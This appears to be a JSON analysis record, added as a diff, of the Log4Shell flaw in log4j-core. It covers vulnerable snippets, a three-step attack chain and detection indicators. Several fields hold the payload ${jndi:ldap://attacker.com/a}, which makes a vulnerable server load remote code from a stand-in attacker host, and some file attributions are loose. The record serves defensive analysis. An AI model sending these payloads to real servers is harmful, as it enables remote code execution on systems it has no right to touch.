@@ -1,0 +1,125 @@
+{
+  "package_info": {
+    "package_name": "log4j-core",
+    "package_manager": "Maven (Java)",
+    "package_versions": "2.0-beta9 through 2.15.0",
+    "why_malicious": "The package contains a critical vulnerability (CVE-2021-44228, 'Log4Shell') that allows remote code execution via untrusted JNDI lookups, enabling attackers to execute arbitrary code on affected systems by simply logging a specially crafted string."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (whenever a log event is processed)",
+        "file_location": "log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "classloader"
+        ]
+      },
+      "code_snippet": "${jndi:ldap://attacker.com/a}",
+      "code_language": "java (log4j configuration syntax)",
+      "code_behavior": "At runtime, the code evaluates the log message, triggers a JNDI lookup using the attacker-controlled LDAP URL, fetches a remote Java class, and executes it, resulting in remote code execution.",
+      "malice_analysis": {
+        "why_suspicious": "This behavior allows untrusted user input to trigger network requests and load/execute remote code, which is a classic remote code execution vector.",
+        "violated_expectations": "Normal logging should never result in network requests or code execution based on log message content.",
+        "similar_legitimate_use": "JNDI lookups are sometimes used for legitimate resource discovery in trusted environments, but never with untrusted user input.",
+        "key_indicators": [
+          "Use of ${jndi:...} in log messages",
+          "Network requests to attacker-controlled LDAP/HTTP servers",
+          "Dynamic loading and execution of remote Java classes"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (log event processing)",
+        "file_location": "log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java",
+        "required_permissions": [
+          "network",
+          "classloader"
+        ]
+      },
+      "code_snippet": "public <T> T lookup(final String name) { ... // performs JNDI lookup based on input string }",
+      "code_language": "java",
+      "code_behavior": "At runtime, the function processes the input string, performs a JNDI lookup using the provided name, and loads the resulting object, which may be a remote Java class from an attacker-controlled server.",
+      "malice_analysis": {
+        "why_suspicious": "The lookup function is exposed to untrusted input, allowing attackers to control the JNDI resource and deliver malicious payloads.",
+        "violated_expectations": "JNDI lookups should not be performed on untrusted or user-controlled input.",
+        "similar_legitimate_use": "JNDI is used for resource discovery in enterprise Java, but only with trusted sources.",
+        "key_indicators": [
+          "JNDI lookups on user-controlled strings",
+          "No protocol whitelisting or input validation",
+          "Ability to specify arbitrary LDAP/HTTP endpoints"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (log event processing)",
+        "file_location": "log4j-core/src/main/java/org/apache/logging/log4j/core/appender/mom/JmsAppender.java",
+        "required_permissions": [
+          "network",
+          "classloader"
+        ]
+      },
+      "code_snippet": "LOGGER.warn(\"Request User-Agent: {}\", userAgent); // userAgent = ${jndi:ldap://attacker.com/a}",
+      "code_language": "java",
+      "code_behavior": "At runtime, the logger processes a log message containing a user-supplied value, which is interpreted as a JNDI lookup, resulting in a network request and potential code execution.",
+      "malice_analysis": {
+        "why_suspicious": "Logging user-controlled data should not result in code execution or network activity.",
+        "violated_expectations": "Loggers should treat input as data, not as code or lookup expressions.",
+        "similar_legitimate_use": "None; this is a clear abuse of logging functionality.",
+        "key_indicators": [
+          "Log messages containing ${jndi:...} patterns",
+          "User input directly influencing code execution"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends a crafted HTTP request with a malicious JNDI payload in a header (e.g., User-Agent: ${jndi:ldap://attacker.com/a})",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_3"
+      ],
+      "leads_to": "Log4j processes the log message and triggers a JNDI lookup"
+    },
+    {
+      "step": 2,
+      "action": "Log4j's JndiLookup functionality performs a JNDI lookup to the attacker-controlled LDAP server",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "LDAP server responds with a reference to a remote Java class"
+    },
+    {
+      "step": 3,
+      "action": "Vulnerable server loads and executes the remote Java class, resulting in remote code execution",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker gains code execution on the vulnerable server"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Log messages containing ${jndi:ldap://...} or similar patterns",
+      "Unexpected outbound LDAP or RMI network connections from application servers",
+      "Dynamic loading of Java classes from remote sources during log processing"
+    ],
+    "file_indicators": [
+      "Presence of JndiLookup.class in log4j-core JARs",
+      "log4j-core versions 2.0-beta9 through 2.15.0 in dependency manifests"
+    ],
+    "network_indicators": [
+      "Outbound LDAP/RMI/HTTP requests to untrusted or external servers",
+      "Connections to attacker infrastructure following log events"
+    ],
+    "how_to_detect": "Monitor application logs for suspicious ${jndi:...} patterns, inspect network traffic for unexpected LDAP/RMI/HTTP requests originating from application servers, and scan software inventories for vulnerable log4j-core versions or the presence of JndiLookup.class. Use WAF rules to block requests containing JNDI patterns and implement egress filtering to prevent unauthorized outbound connections."
+  }
+}
